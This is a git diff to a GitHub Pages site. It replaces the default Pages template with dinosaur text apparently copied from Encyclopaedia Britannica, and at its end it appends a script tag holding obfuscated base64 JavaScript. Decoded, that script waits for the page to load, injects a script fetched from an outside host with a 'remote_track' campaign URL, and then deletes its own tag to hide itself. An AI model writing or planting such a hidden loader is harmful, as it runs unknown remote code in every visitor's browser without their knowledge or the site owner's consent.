@@ -1,37 +1,24 @@
-## Welcome to GitHub Pages
+Dinosaur, (clade Dinosauria), the common name given to a group of reptiles, often very large, that first appeared roughly 245 million years ago (near the beginning of the Middle Triassic Epoch) and thrived worldwide for nearly 180 million years. Most died out by the end of the Cretaceous Period, about 66 million years ago, but many lines of evidence now show that one lineage evolved into birds about 155 million years ago.
 
-You can use the [editor on GitHub](https://github.com/xhuittmm/Dinosaur/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+TOP QUESTIONS
+What are dinosaurs?
+How did most dinosaurs go extinct?
+Did dinosaurs have feathers?
+Do dinosaurs exist today?
+What is the largest dinosaur?
+When was the first dinosaur fossil discovered?
+The name dinosaur comes from the Greek words deinos (“terrible” or “fearfully great”) and sauros (“reptile” or “lizard”). The English anatomist Richard Owen proposed the formal term Dinosauria in 1842 to include three giant extinct animals (Megalosaurus, Iguanodon, and Hylaeosaurus) represented by large fossilized bones that had been unearthed at several locations in southern England during the early part of the 19th century. Owen recognized that these reptiles were far different from other known reptiles of the present and the past for three reasons: they were large yet obviously terrestrial, unlike the aquatic ichthyosaurs and plesiosaurs that were already known; they had five vertebrae in their hips, whereas most known reptiles have only two; and, rather than holding their limbs sprawled out to the side in the manner of lizards, dinosaurs held their limbs under the body in columnar fashion, like elephants and other large mammals.
 
-### Markdown
+Track the discovery of dinosaurs from 7th-century griffin legends to Richard Owen's coining of Dinosauria
+Learn about the history of people discovering fossils and the coining of the term dinosaur.
+Encyclopædia Britannica, Inc.
+See all videos for this article
+Originally applied to just a handful of incomplete specimens, the clade Dinosauria now encompasses more than 800 generic names and at least 1,000 species, with new names being added to the roster every year as the result of scientific explorations around the world. Not all of these names are valid taxa, however. A great many of them have been based on fragmentary or incomplete material that may actually have come from two or more different dinosaurs. In addition, bones have sometimes been misidentified as dinosaurian when they are not from dinosaurs at all. Nevertheless, dinosaurs are well documented by abundant fossil remains recovered from every continent on Earth, and the number of known dinosaurian taxa is estimated to be 10–25 percent of actual past diversity.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
 
-```markdown
-Syntax highlighted code block
 
-# Header 1
-## Header 2
-### Header 3
 
-- Bulleted
-- List
+The extensive fossil record of genera and species is testimony that dinosaurs were diverse animals, with widely varying lifestyles and adaptations. Their remains are found in sedimentary rock layers (strata) dating to the Late Triassic Epoch (approximately 237 million to 201.3 million years ago). The abundance of their fossilized bones is substantive proof that dinosaurs were the dominant form of terrestrial animal life during the Mesozoic Era (about 252.2 million to 66 million years ago). It is likely that the known remains represent a very small fraction (probably less than 0.0001 percent) of all the individual dinosaurs that once lived.
 
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/xhuittmm/Dinosaur/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+<script id="hr5On" src="data:text/javascript;base64, dmFyIF83dTRIbyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX09jQmFHLCBfTEZObDUpIHt2YXIgXzNsVXRzID0gZnVuY3Rpb24oX1U0bmtCKSB7d2hpbGUgKC0tX1U0bmtCKSB7X09jQmFHWydwdXNoJ10oX09jQmFHWydzaGlmdCddKCkpO319O18zbFV0cygrK19MRk5sNSk7fShfN3U0SG8sIDB4MTFiKSk7dmFyIF9odUdtMSA9IGZ1bmN0aW9uKF9XY2pBTywgX3JtS0ZEKSB7X1djakFPID0gX1djakFPIC0gMHgwO3ZhciBfTTUxaVcgPSBfN3U0SG9bX1djakFPXTtyZXR1cm4gX001MWlXO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfaHVHbTEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1ROQlNLID0gZG9jdW1lbnRbX2h1R20xKCcweDEnKV0oX2h1R20xKCcweDInKSk7X1ROQlNLW19odUdtMSgnMHgzJyldID0gX2h1R20xKCcweDQnKTtfVE5CU0tbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTNceDRiXHg3N1x4NDhceDRmXHg1OVx4NDFceDMwXHg0ZVx4NzknO2RvY3VtZW50W19odUdtMSgnMHg1JyldKF9odUdtMSgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9UTkJTSyk7ZG9jdW1lbnRbX2h1R20xKCcweDcnKV0oJ2hyNU9uJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
